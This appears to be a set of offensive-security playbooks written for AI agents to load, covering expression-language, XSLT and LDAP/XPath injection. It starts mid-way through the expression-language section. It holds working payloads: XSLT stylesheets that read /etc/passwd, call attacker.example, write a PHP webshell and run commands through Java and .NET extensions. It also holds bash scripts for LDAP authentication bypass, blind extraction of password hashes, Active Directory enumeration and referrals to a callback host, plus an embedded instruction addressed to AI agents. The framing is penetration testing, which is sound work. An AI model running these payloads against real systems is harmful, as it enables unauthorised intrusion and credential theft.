│   ├── Struts2: #_memberAccess bypass → @Runtime@exec
│   ├── Confluence: CVE-2021-26084 querystring injection
│   └── MyBatis: ${param} vs #{param} (literal injection)
│
├── Java EL?
│   ├── Restricted by default → try ClassLoader access
│   ├── Look for unrestricted ELResolver config
│   └── Probe applicationScope, sessionScope, pageContext
│
└── MVEL?
    └── No sandbox: Runtime.exec('cmd') directly
```

---

## 9. KNOWN CVEs SUMMARY

| CVE | Product | Vector | Severity |
|---|---|---|---|
| CVE-2022-22947 | Spring Cloud Gateway < 3.1.1 | Actuator route SpEL | CVSS 10 |
| CVE-2021-26084 | Confluence Server/DC | WebWork OGNL querystring | CVSS 9.8 |
| CVE-2017-5638 | Apache Struts2 | Content-Type OGNL | CVSS 10 |
| CVE-2016-4461 | Apache Struts2 | ActionMessage OGNL | CVSS 9.8 |
| CVE-2013-2251 | Apache Struts2 | action/redirect OGNL | CVSS 10 |
| CVE-2018-11776 | Apache Struts2 | Namespace OGNL | CVSS 10 |
| CVE-2022-22963 | Spring Cloud Function | routing-expression SpEL | CVSS 9.8 |

---

## 10. TOOL REFERENCES

```bash
# Nuclei templates for EL injection CVEs
nuclei -t cves/ -t fuzzing/expression-language-injection.yaml -u https://target

# Struts2 scanner
strauts2scanner -u https://target/action

# Spring actuator check
curl http://target/actuator/gateway/routes
```



---

## xslt-injection

# SKILL: XSLT Injection — Testing Playbook

> **AI LOAD INSTRUCTION**: XSLT injection occurs when attacker-influenced XSLT is compiled/executed server-side. Map the processor family first (Java/.NET/PHP/libxslt). Then chain document(), external entities, EXSLT, or embedded script/extension functions per platform. Routing note: if input is generic XML parsing, cross-load xxe-xml-external-entity; if outbound document(http:...) requests matter, cross-load ssrf-server-side-request-forgery.

## 0. RELATED ROUTING

- xxe-xml-external-entity — DTD/entity hardening, generic XML parsers
- ssrf-server-side-request-forgery — when document(http:...) causes server fetches

---

## 1. QUICK START

1. **Find sinks**: parameters named `xslt`, `stylesheet`, `transform`, `template`, SOAP stylesheets, report generators, XML→HTML converters.
2. **Probe reflection**: inject unique namespace or `xsl:value-of select="'marker'"` — if output changes, execution likely.
3. **Fingerprint** processor (§2).
4. **Escalate** by family: document() / XXE (§3–4), EXSLT write (§5), PHP (§6), Java (§7), .NET (§8).

**Quick probe** (harmless marker):
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:value-of select="'XSLT_PROBE_OK'"/>
  </xsl:template>
</xsl:stylesheet>
```

---

## 2. VENDOR DETECTION

Use standard `system-property` reads inside expressions:

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:text>vendor=</xsl:text><xsl:value-of select="system-property('xsl:vendor')"/>
    <xsl:text>&#10;version=</xsl:text><xsl:value-of select="system-property('xsl:version')"/>
    <xsl:text>&#10;vendor-url=</xsl:text><xsl:value-of select="system-property('xsl:vendor-url')"/>
  </xsl:template>
</xsl:stylesheet>
```

| Signal | Engine |
|---|---|
| `Apache Software Foundation` / Xalan markers | Xalan (Java) |
| `Saxonica` / Saxon URI hints | Saxon (Java) |
| `libxslt` / GNOME stack | libxslt (C — often PHP, Nginx modules) |
| Microsoft URLs / MSXML strings | MSXML / .NET XSLT stack |

---

## 3. EXTERNAL ENTITY (XXE VIA XSLT)

XSLT 1.0 allows DTD-based entities in the stylesheet when the parser permits DTDs:

```xml
<!DOCTYPE xsl:stylesheet [
  <!ENTITY ext_file SYSTEM "file:///etc/passwd">
]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="'ENTITY_START'"/>
    <xsl:value-of select="&ext_file;"/>
    <xsl:value-of select="'ENTITY_END'"/>
  </xsl:template>
</xsl:stylesheet>
```

**Note**: Hardened parsers disable external DTDs — failure here does not disprove other XSLT vectors.

---

## 4. FILE READ VIA `document()`

`document()` loads another XML document into a node-set. Local files often parse as XML (noisy) but errors and partial reads may still leak.

**Unix:**
```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:copy-of select="document('/etc/passwd')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Windows:**
```xml
<xsl:copy-of select="document('file:///c:/windows/win.ini')"/>
```

**SSRF / out-of-band:**
```xml
<xsl:copy-of select="document('http://attacker.example/ssrf')"/>
```

Chain with error-based or timing observations if inline data doesn't return to the client.

---

## 5. FILE WRITE VIA EXSLT (`exslt:document`)

When EXSLT common extension is enabled:

```xml
<xsl:stylesheet version="1.0"
  xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
  xmlns:exploit="http://exslt.org/common"
  extension-element-prefixes="exploit">
  <xsl:template match="/">
    <exploit:document href="/tmp/evil.txt" method="text">
      <xsl:text>PROOF_CONTENT</xsl:text>
    </exploit:document>
  </xsl:template>
</xsl:stylesheet>
```

**Impact**: arbitrary file write where path permissions allow — often RCE via webroot, cron paths, or inclusion points.

---

## 6. RCE VIA PHP (`php:function`)

Requires PHP XSLT with `registerPHPFunctions()`-style exposure (application misconfiguration):

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <xsl:value-of select="php:function('readfile','index.php')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Directory listing:**
```xml
<xsl:value-of select="php:function('scandir','.')"/>
```

**Webshell write (if callable is exposed):**
```xml
<xsl:value-of select="php:function('file_put_contents','/var/www/html/shell.php','&lt;?php system($_GET[cmd]); ?&gt;')"/>
```

**Legacy PHP `/e` modifier pattern** (PHP < 7, lab only):
```php
preg_replace('/.*/e', 'eval(base64_decode("BASE64_PHP_HERE"));', '', 1);
```

---

## 7. RCE VIA JAVA (XALAN EXTENSIONS)

Java engines may expose extension functions mapping to static methods. Requires specific extension namespace binding:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime">
  <xsl:template match="/">
    <xsl:variable name="rtobject" select="rt:getRuntime()"/>
    <xsl:value-of select="rt:exec($rtobject,'/bin/sh -c id')"/>
  </xsl:template>
</xsl:stylesheet>
```

**Saxon-style (config-dependent):**
```
Runtime:exec(Runtime:getRuntime(), 'cmd.exe /C ping 127.0.0.1')
```

If extensions are disabled (common secure default), pivot to `document()`, SSRF, or deserialization.

---

## 8. RCE VIA .NET (`msxsl:script`)

When Microsoft XSLT script blocks are allowed:

```xml
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt"
    extension-element-prefixes="msxsl">
  <msxsl:script language="C#" implements-prefix="user">
    <![CDATA[
    public string xexec() {
      System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
      return "ok";
    }
    ]]>
  </msxsl:script>
  <xsl:template match="/">
    <xsl:value-of select="user:xexec()"/>
  </xsl:template>
</xsl:stylesheet>
```

Default secure configs often disable scripts — treat this as **when enabled** behavior.

---

## 9. DECISION TREE

```
User influences XSLT or XML transform?
├── NO → out of scope
└── YES
    ├── Output reflects injected logic?
    │   ├── YES → system-property() fingerprint vendor
    │   │   ├── libxslt (PHP) → php:function RCE, document() file read, EXSLT write
    │   │   ├── Java (Xalan/Saxon) → rt:exec extension, document() SSRF
    │   │   └── .NET (MSXML) → msxsl:script C# code execution
    │   └── NO → try blind channels
    │       ├── document('http://attacker/') → OOB SSRF
    │       ├── EXSLT write to detectable path
    │       └── Timing via sleep/complex computation
    │
    ├── DTD allowed? → XXE via entity in stylesheet
    ├── EXSLT enabled? → file write primitive
    └── All execution blocked?
        └── document() SSRF still often works → pivot to SSRF attack chains
```

---

## 10. TOOLING

| Category | Tool/Method |
|---|---|
| Proxy / manual | Burp Suite, OWASP ZAP — replay stylesheet payloads |
| XML/XSLT lab | Match exact processor (PHP libxslt, Java Saxon version, .NET) in a VM |
| Out-of-band | Burp Collaborator / callback server for `document('http://...')` |

No single universal scanner replaces version-specific behavior validation.



---

## ldap

# HUNT-LDAP — LDAP Injection & XPath Injection

> Grounding note: LDAP injection is rarely disclosed with verbatim payloads on
> public platforms (most live on internal-pentest reports). This skill is
> grounded in the **OWASP LDAP Injection Prevention / Testing Guide
> (WSTG-INPV-06)**, **PortSwigger Web Security Academy (LDAP injection)**, and
> the **RFC 4515** filter grammar — all publicly verifiable references rather
> than invented HackerOne IDs. Do not cite a report you cannot link.

## Crown Jewel Targets

LDAP injection that bypasses authentication = **Critical**. Blind attribute
exfiltration of credentials/secrets = **High**. AD enumeration alone = Medium-High.

**Highest-value chains:**
- **LDAP auth bypass** — close the `uid` filter and append an always-true OR so the
  bind/search returns the admin entry without a valid password.
- **Blind attribute exfil** — char-by-char extraction of an attribute value via a
  boolean oracle (login success/failure, result count, or response length).
- **userPassword hash exfil (non-AD only)** — on OpenLDAP/389-DS the
  `userPassword` attribute can hold `{SSHA}`/`{CRYPT}` hashes that ARE readable
  by query. See the AD-vs-generic warning below.
- **XPath injection auth bypass** — `' or '1'='1` against XML-backed auth.

---

## CRITICAL — Active Directory vs generic LDAP

Do **not** conflate the two. They behave very differently:

| | Generic LDAP (OpenLDAP, 389-DS, ApacheDS) | Active Directory |
|---|---|---|
| Password attribute | `userPassword` — may hold `{SSHA}`/`{MD5}`/`{CRYPT}` and **is readable** if ACL allows | `unicodePwd` — **write-only**, never returned by any search |
| Hash exfil via injection | **Possible** where ACLs leak `userPassword` | **Not possible** — there is no readable hash attribute over LDAP |
| Useful enum attrs | `uid`, `cn`, `mail`, `userPassword` | `sAMAccountName`, `userPrincipalName`, `mail`, `memberOf`, `description` (often holds plaintext secrets!) |

**Do not tell a reader that blind LDAP injection yields AD password hashes — it
does not.** `unicodePwd` is write-only. Against AD, the win is enumeration
(`sAMAccountName`, `memberOf`, `description`/`info` fields that admins misuse to
store passwords) and auth bypass — not hash dumping. The hash-exfil technique
applies **only** to non-AD directories exposing `userPassword`.

---

## Attack Surface Signals

```
Corporate SSO / intranet login pages (often legacy Java/Spring/PHP)
Windows + IIS + "integrated" directory auth
/api/ldap/*  /api/directory/*  /people  /address-book  /search?dir=
"Find a colleague" / org-chart / employee-search features
XML-backed config or auth → XPath injection candidate
Error strings that confirm an LDAP backend:
  javax.naming.NameNotFoundException
  javax.naming.directory.InvalidSearchFilterException
  LDAP: error code 49 - 80090308  (AD invalid creds / bind failure)
  com.sun.jndi.ldap.*  /  System.DirectoryServices  /  ldap_search():
  "Bad search filter"  /  net.ldap (Go)  /  python-ldap SERVER_DOWN
```

---

## LDAP filter grammar (RFC 4515) — why injection works

A login filter is typically built by string-concat:

```
(&(uid=<USERNAME>)(userPassword=<PASSWORD>))
```

`&` = AND, `|` = OR, `!` = NOT. **Filters are prefix/Polish notation** — the
operator comes first and every sub-filter is parenthesised. To inject you must
(a) escape the current `(uid=...)` group, (b) inject your own logic, and
(c) leave the overall parenthesis count **balanced** or the server throws a
filter-syntax error instead of executing.

### The special-character set — TEST EACH ONE

These characters are syntactically meaningful and MUST be escaped by a safe app
(RFC 4515 §3). If the app reflects an error or behaves differently when you send
them raw, the input is unescaped → injectable:

| Char | Filter escape | Why it matters |
|------|---------------|----------------|
| `*`  | `\2a` | wildcard — matches any value |
| `(`  | `\28` | opens a filter group |
| `)`  | `\29` | closes a filter group |
| `\`  | `\5c` | escape char itself |
| NUL  | `\00` | string terminator — truncates filter in C-backed servers |
| `/`  | (DN context) | RDN separator — relevant for DN injection |

**Search-filter context vs DN injection** are different bugs:
- **Search-filter injection** (most common): your input lands inside a
  `(attr=VALUE)` filter. Payloads use `* ( ) & | !`.
- **DN injection**: your input is concatenated into a Distinguished Name
  (`uid=VALUE,ou=people,dc=corp`). Here `,` `=` `+` `"` `\` `<` `>` `;` and `/`
  matter, and a `*` is NOT a wildcard. Test both — the payloads do not transfer.

---

## Step-by-Step Hunting Methodology

### Phase 1 — Confirm an LDAP backend (baseline first)

```bash
# ALWAYS capture a control response first — you compare everything to this.
BASE=$(curl -s -o /dev/null -w "%{http_code}|%{size_download}|%{time_total}" \
  -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"validlookinguser","password":"wrongpass"}')
echo "BASELINE (valid-format, wrong pw): $BASE"

# Send a single unbalanced paren. A SAFE (escaping) app → identical baseline.
# An INJECTABLE app → 500 / filter-syntax error / different size.
curl -s -X POST https://$TARGET/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"test)","password":"x"}' | grep -iE \
  "naming|InvalidSearchFilter|error code 49|Bad search filter|jndi|ldap_search"
```

A lone `)` that produces a syntax error/500 while a balanced payload does not is
the cleanest LDAP-injection tell — note it, you will need it as proof.

### Phase 2 — Auth-bypass payloads (balance your parentheses)

```bash
# Target filter assumed: (&(uid=USERNAME)(userPassword=PASSWORD))
# Goal: make the uid sub-filter always-true and neutralise the password clause.

# Wildcard-everything (works when password clause is dropped by a trailing comment-like break):
#   username = *)(uid=*))(|(uid=*    password = anything
# Always-true admin (OR uid=*):
#   username = admin)(|(uid=*)       (note: leaves one extra ')' — see below)
# NUL-truncate the password clause (C-backed servers):
#   username = admin)(uid=*))%00      password = x

USERNAME_PAYLOADS=(
  'admin))(|(uid=*'        # close uid + close &, open OR uid=* — balance check below
  '*)(uid=*))(|(uid=*'     # full always-true, self-balancing classic
  'admin)(!(userPassword=ZZZ))'  # AND NOT a password that is never set → always true
  'admin*'                 # simple wildcard suffix — try first, lowest noise
)

for P in "${USERNAME_PAYLOADS[@]}"; do
  R=$(curl -s -w "|%{http_code}|%{size_download}" -X POST https://$TARGET/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":$(python3 -c 'import json,sys;print(json.dumps(sys.argv[1]))' "$P"),\"password\":\"anything\"}")
  echo "PAYLOAD: $P"
  echo "RESP:    ${R: -40}"
  echo "BASE:    $BASE   <-- compare http_code+size to rule out false positive"
  echo "---"
done
```

**Parenthesis-balancing rule of thumb:** count `(` minus `)` in the *resulting*
full filter, not just your payload. If the app appends `)(userPassword=...))`
after your input, leave the right number of trailing `)` so the final string is
balanced. An unbalanced filter = syntax error = NOT a bypass (false positive).

### Phase 3 — Blind exfil with a CONTROLLED oracle (not raw byte-count)

Raw `size_download` diffing is noise-prone (WAF banners, CSRF tokens, timestamps,
length-jitter on the injected char itself). Use a **paired true/false control**
so the oracle is the *response*, not the absolute size.

```bash
# Oracle pair: a known-TRUE filter and a known-FALSE filter on a public attr.
# TRUE : admin)(uid=*))(|(uid=*     -> entry exists
# FALSE: admin)(uid=NONEXIST_ZZZ))(|(uid=NONEXIST_ZZZ
probe () {  # $1 = filter-tail payload -> prints normalized size
  curl -s -o /dev/null -w "%{size_download}" -X POST https://$TARGET/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"$1\",\"password\":\"x\"}"
}
T=$(probe 'admin)(uid=*))(|(uid=*')
F=$(probe 'admin)(uid=NONEXIST_ZZZ))(|(uid=NONEXIST_ZZZ')
echo "TRUE-class size=$T  FALSE-class size=$F"
[ "$T" = "$F" ] && { echo "No length oracle — try a STATUS or BODY-MARKER oracle, or OOB."; exit; }

# Now extract char-by-char. The boolean test compares against $T/$F, NOT a guess.
# Filter: (&(uid=admin)(userPassword=<PREFIX><CHAR>*))  on a NON-AD directory.
PREFIX=""
for pos in $(seq 1 32); do
  for C in {a..z} {A..Z} {0..9} '$' '/' '.' '+' '=' '{' '}'; do
    S=$(probe "admin)(userPassword=${PREFIX}${C}*))(|(uid=*")
    if [ "$S" = "$T" ]; then PREFIX="${PREFIX}${C}"; echo "[$pos] -> $PREFIX"; break; fi
  done
done
echo "RECOVERED: $PREFIX"
```

False-positive guards for blind exfil:
- **Repeat each positive char 3x** and confirm the size is stable — length-jitter
  from the attacker-controlled char itself is the #1 false positive.
- Confirm the **FALSE control still returns the FALSE size** after each round (the
  app didn't just start erroring on every request — WAF block looks like a match).
- If body length is unreliable, switch the oracle to **HTTP status**, a **body
  marker string** (`"Invalid credentials"` present/absent), or **timing** with a
  heavy filter — but only after establishing a stable baseline delta.

### Phase 4 — XPath injection (XML-backed auth)

```bash
# Normal: //users/user[name/text()='ADMIN' and password/text()='PASS']
# Bypass closes the name predicate and OR-trues the whole expression.
XPATH_PAYLOADS=(
  "' or '1'='1"
  "' or ''='"
  "admin' or '1'='1' or 'a'='b"     # keeps quoting balanced
  "x'] | //user/* | //user[name()='x"  # blind: dump all user nodes (XPath has no comments)
  "*[contains(name(),'pass')]"          # node-name discovery
)
for P in "${XPATH_PAYLOADS[@]}"; do
  E=$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))' "$P")
  R=$(curl -s -w "|%{http_code}|%{size_download}" -X POST https://$TARGET/api/login \
    --data-urlencode "username=$P" --data-urlencode "password=x")
  echo "$P  ->  ${R: -24}"
done
# XPath has NO comment syntax — you must keep quotes/brackets balanced, unlike SQLi.
```

### Phase 5 — AD enumeration via wildcard (count oracle, with control)

```bash
# Establish that prefix='zzqx' (unlikely) returns ~0 and prefix='a' returns more.
# A directory that returns the SAME count for both is NOT leaking via wildcard.
count () { curl -s -X POST https://$TARGET/api/directory/search \
  -H "Content-Type: application/json" -d "{\"filter\":\"(sAMAccountName=$1*)\"}" \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("results",d.get("users",[]))))' 2>/dev/null; }
CTRL=$(count "zzqx_unlikely")
echo "control count (should be ~0): $CTRL"
for L in {a..z}; do echo "$L* -> $(count $L)  (vs control $CTRL)"; done
# Then pivot to memberOf / description for privileged accounts:
#   (&(sAMAccountName=*)(memberOf=*Domain Admins*))
#   (description=*pw*)   (description=*pass*)   — admins stash secrets here
```

### Phase 6 — Tooling & OOB confirmation

```bash
# Validate the inferred filter directly if you ever get LDAP creds / a bind:
ldapsearch -x -H ldap://$AD_HOST -D "CORP\\user" -w "$PW" \
  -b "dc=corp,dc=local" "(&(objectClass=user)(sAMAccountName=admin*))" sAMAccountName memberOf

# Burp: Intruder over the char set for blind exfil; the Web Security Academy
# "Blind LDAP injection" labs mirror the Phase-3 oracle exactly.
# OOB (rare but decisive): some JNDI/LDAP stacks resolve a referral. If you can
# inject a referral/URL the server dereferences, point it at Collaborator:
#   (uid=*))(referral=ldap://<COLLAB>/x)   — a DNS/LDAP hit at Collaborator
# is server-side proof with zero ambiguity. Treat any Collaborator interaction
# as the gold-standard confirmation for otherwise-blind cases.
```

---

## Chain Table

| LDAP finding | Chain to | Impact |
|--------------|----------|--------|
| Auth-bypass (always-true filter) | Admin/SSO panel as first directory entry | Critical |
| AD enumeration (`sAMAccountName`) | Username list → password spray / credential stuffing | Mass-ATO risk |
| `memberOf` enumeration | Identify Domain Admins → targeted phishing/spray | Targeted compromise |
| `description`/`info` field read | Plaintext creds admins stashed there | Direct credential leak |
| Blind exfil of `userPassword` **(non-AD only)** | `{SSHA}` (salted SHA-1) → hashcat `-m 111` (`{SSHA256}`=1411, `{SSHA512}`=1711); `{CRYPT}` → mode depends on the `$id$` prefix (`$1$`=500, `$6$`=1800) → offline crack | High |
| LDAP referral → Collaborator | Server-side request / internal directory reach | SSRF-class, confirms blind |

> AD has no readable password attribute — do not list "extract AD hashes" as a
> chain. Against AD, the credential win comes from `description`/`info` misuse or
> from enumerated usernames feeding a spray, never from `unicodePwd`.

---

## Validation — rule out the false positive BEFORE you report

A "bypass" or "match" is only real once you have eliminated syntax-error,
WAF-block, and length-jitter explanations.

- [ ] **Auth bypass:** the always-true payload returns a **valid authenticated
      session** (session cookie + access to a post-login resource), and the same
      request with one paren removed returns a **filter-syntax error** — proving
      the filter parsed and executed, not that the app fell open on every input.
- [ ] **Negative control:** an equivalently-shaped but logically-FALSE payload
      (`)(uid=NONEXISTENT_ZZZ)`) returns the **failure** response. If both
      true-class and false-class "succeed", you found a broken endpoint, not LDAP
      injection.
- [ ] **Blind exfil:** each recovered char reproduces 3x with stable size; the
      FALSE control still reads FALSE between rounds; recovered value verified by
      a direct lookup or by the auth-bypass payload that uses it.
- [ ] **XPath:** quotes/brackets remained balanced (no 500), and the bypass logged
      in to a real account context — not just a different error page.
- [ ] **OOB where possible:** a Collaborator DNS/LDAP interaction from a referral
      payload is decisive for blind cases — prefer it over length-only inference.
- [ ] **AD claim discipline:** if you say "AD", you enumerated AD-specific attrs
      (`sAMAccountName`/`memberOf`); never claim AD hash exfil.

**Severity:**
- Auth bypass landing as admin/privileged directory entry: **Critical**
- `userPassword` hash exfil (non-AD) or `description`-field credential read: **High**
- AD user/group enumeration only: **Medium-High**
- Blind boolean oracle confirmed but no useful attribute reachable: **Medium**


